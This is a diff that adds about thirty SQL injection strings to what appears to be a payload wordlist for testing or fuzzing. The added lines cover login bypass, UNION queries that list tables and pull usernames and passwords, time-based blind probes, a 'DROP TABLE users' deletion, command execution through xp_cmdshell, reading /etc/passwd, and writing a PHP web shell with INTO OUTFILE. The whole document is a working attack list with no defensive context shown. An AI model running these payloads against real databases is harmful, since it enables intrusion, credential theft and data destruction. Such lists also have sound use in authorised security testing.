@@ -54,3 +54,33 @@ admin'/*
 " OR 1=1--
 " OR 1=1#
 " or 1=1/*
+' OR '1'='1
+' OR 1=1--
+' OR 'a'='a
+" OR "1"="1
+" OR 1=1--
+admin'--
+admin' #
+' or 1=1 limit 1 --
+'='
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns--
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+' AND '1'='2' UNION SELECT NULL--
+'; DROP TABLE users--
+'; EXEC xp_cmdshell('dir')--
+' OR SLEEP(5)--
+' OR pg_sleep(5)--
+' OR BENCHMARK(10000000,MD5('A'))--
+' UNION SELECT @@version--
+' UNION SELECT user()--
+' UNION SELECT database()--
+' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT load_file('/etc/passwd')--
+' INTO OUTFILE '/var/www/html/shell.php'--
+' AND 1=0 UNION SELECT NULL,username,password FROM users--
